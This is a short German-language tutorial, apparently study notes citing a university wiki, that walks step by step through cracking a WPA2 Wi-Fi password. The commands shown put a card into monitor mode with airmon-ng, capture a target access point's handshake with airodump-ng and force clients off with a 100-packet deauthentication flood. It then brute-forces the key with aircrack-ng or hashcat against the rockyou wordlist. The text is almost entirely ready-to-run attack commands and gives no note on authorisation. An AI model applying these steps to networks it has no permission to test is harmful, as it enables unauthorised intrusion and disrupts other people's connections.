## Installation
`$ sudo apt install aircrack-ng`
## Monitor-Modus
### **Testen** mit:
`$ iw list`
-> Supported interface modes: "monitor"
### Monitor-Modus aktivieren
`$ sudo airmon-ng start wlan0`
falls Prozesse laufen welche dies verhindern:
`$ sudo airmon-ng check kill`
Anschließend testen mit `$ iwconfig`

## Durchführung
### Informationsbeschaffung über Access-Point
`$ sudo airodump-ng wlan0mon`
- BSSID
- Channel
- ESSID
### Aufzeichnen des 4-Wege-Handshakes
`sudo airodump-ng wlan0mon --bssid A0:04:60:39:91:A5 --channel 2 -w capture`
- --bssid A0:04:60:39:91:A5
	Gibt die BSSID (Access Point MAC-Adresse) an.
- --channel 2
	Gibt den zu verwendenden Channel ein.
- -w capture
	Gibt an in welche Datei die aufgezeichneten Pakete gespeichert werden.
```
Wird kein Client mit Access Point verbunden (kein Handshake aufgezeichnet):
`$ sudo aireplay-ng --deauth 100 -a A0:04:60:39:91:A5 wlan0mon`
- --deauth 100:
	Sendet 100 Deauthentifizierungs-Pakete.
- -a A0:04:60:39:91:A5:
	Gibt die BSSID (Access Point MAC-Adresse) an.
- wlan0mon:
	interface
```
### Brute-Force-Angriff
`$ sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt`
- -w wordlist
#### Alternativ hashcat (GPU-Berechnung):
Umwandeln der aufgezeichneten Datei:
`$ aircrack-ng -J capture.cap capture.hccap`
Hashcat ausführen:
`$ hashcat.exe -m 2500 capture.hccapx rockyou.txt`
- -m 2500:
	Hash-Modus: WPA-EAPOL-PBKDF2

Quelle: https://sarwiki.informatik.hu-berlin.de/WPA2-Angriff